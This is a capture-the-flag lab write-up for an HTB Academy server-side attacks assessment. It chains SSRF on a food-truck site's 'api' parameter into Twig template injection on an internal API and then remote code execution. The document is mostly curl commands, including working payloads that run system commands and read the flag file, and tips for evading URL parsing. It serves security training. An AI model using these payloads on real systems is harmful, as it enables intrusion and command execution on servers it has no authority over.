# HTB Academy — CWES Server-Side Attacks Skills Assessment

**Target:** `154.57.164.63:30306`
**App:** Flavor Fusion Express — food truck website
**Flag:** `HTB{3b8e2b940775e0267ce39d7c80488fc8}`
**Attack Chain:** SSRF → SSTI (Twig) → RCE

---

## Session Notes

```
External app:     154.57.164.63:30306 (Flavor Fusion Express)
Internal API:     truckapi.htb:80 (Apache/2.4.62 Debian)
SSRF parameter:   api (POST, application/x-www-form-urlencoded)
SSTI parameter:   id (GET, on truckapi.htb)
Template engine:  Twig (PHP)
Running as:       uid=33(www-data)
Flag:             /flag.txt
```

---

## Attack Chain

### 1. Initial Recon

```bash
curl -s http://154.57.164.63:30306/
```

Key findings from HTML:
- Page title: "Rogue Pickings" — different from body title "Flavor Fusion Express"
- Three truck location sections populated via JavaScript AJAX
- JavaScript POSTs to `/` with parameter `api=http://truckapi.htb/?id=FusionExpress01`
- Response parsed as JSON: checks `data['error']` or `data['location']`
- `api` parameter accepts a full URL → **SSRF vector identified**
- Internal hostname `truckapi.htb` used — only reachable from the server

### 2. Confirm SSRF (Non-Blind)

```bash
curl -s -X POST http://154.57.164.63:30306/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "api=http://truckapi.htb/?id=FusionExpress01"
# → {"id": "FusionExpress01", "location": "321 Maple Lane"}
```

Response reflected back → **non-blind SSRF confirmed**.

### 3. Internal Port Scan

```bash
seq 1 10000 > ports.txt

ffuf -w ./ports.txt \
  -u http://154.57.164.63:30306/ \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "api=http://127.0.0.1:FUZZ/" \
  -fr "Failed to connect"
```

Results:
- Port 80 → main app itself (same HTML, ruled out)
- Port 3306 → MySQL/MariaDB

### 4. Enumerate truckapi.htb

```bash
# Check 404 response
curl -s -X POST http://154.57.164.63:30306/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "api=http://truckapi.htb/nonexistent"
# → Apache/2.4.62 (Debian) 404 page

# Directory brute-force
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u http://154.57.164.63:30306/ \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "api=http://truckapi.htb/FUZZ.php" \
  -fr "Server at truckapi.htb Port 80"
# → index.php only
```

`truckapi.htb` is a single-endpoint API — only `index.php` which accepts `?id=`.

### 5. Confirm SSTI on truckapi.htb

```bash
# Test {{7*7}}
curl -s -X POST http://154.57.164.63:30306/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "api=http://truckapi.htb/?id={{7*7}}"
# → {"id": "49", ...} → {{}} syntax executes

# Distinguish Jinja2 vs Twig
curl -s -X POST http://154.57.164.63:30306/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "api=http://truckapi.htb/?id={{7*'7'}}"
# → {"id": "49", ...} → Twig confirmed (Jinja2 would give 7777777)
```

### 6. RCE via Twig SSTI

**Critical issue:** Spaces in the Twig payload break the URL being fetched by the SSRF layer — server returns "URL using bad/illegal format or missing URL".

**Fix:** Remove all spaces from Twig syntax AND use `%09` (tab) instead of spaces inside the command string.

```bash
# Confirm RCE — no spaces in payload
curl -s -X POST http://154.57.164.63:30306/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "api=http://truckapi.htb/?id={{['id']|filter('system')}}"
# → uid=33(www-data) gid=33(www-data)

# Find flag — use %09 (tab) for spaces in command
curl -s -X POST http://154.57.164.63:30306/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "api=http://truckapi.htb/?id={{['find%09/%09-name%09flag*%092>/dev/null']|filter('system')}}"
# → /flag.txt

# Read flag
curl -s -X POST http://154.57.164.63:30306/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "api=http://truckapi.htb/?id={{['cat%09/flag.txt']|filter('system')}}"
# → HTB{3b8e2b940775e0267ce39d7c80488fc8}
```

---

## Key Lessons

### SSRF + SSTI chained attack
SSRF doesn't always lead directly to a flag. Here the SSRF was a pivot point — it gave access to an internal API that had its own vulnerability (SSTI). Always enumerate what's reachable through SSRF and test those internal services for additional vulnerabilities.

### Spaces in payloads break SSRF URL fetching
When a Twig payload is embedded inside a URL parameter that the SSRF layer fetches, spaces in the payload cause URL parsing to fail. Two fixes:
1. Remove all spaces from Twig syntax: `{{['cmd']|filter('system')}}` not `{{ ['cmd'] | filter('system') }}`
2. Use `%09` (tab) instead of spaces inside command strings passed to `system()`

### Always use --data-urlencode for SSTI payloads
Raw `-d` with `{{}}` payloads mangles curly braces. `--data-urlencode` properly encodes the `api` parameter value so the server receives a clean URL with the Twig payload intact in the `id` parameter.

### Port 80 on 127.0.0.1 may be the same app
When port scanning via SSRF, `127.0.0.1:80` returned the main app's own HTML — not a separate internal service. Always pull the response to confirm before treating a port as a new target.

### Enumerate internal hostnames, not just IPs
`truckapi.htb` was the real target — scanning `127.0.0.1` ports found the main app on 80 and MySQL on 3306, but the API lived on a named internal hostname. Read the app's JavaScript to find internal hostnames being used.
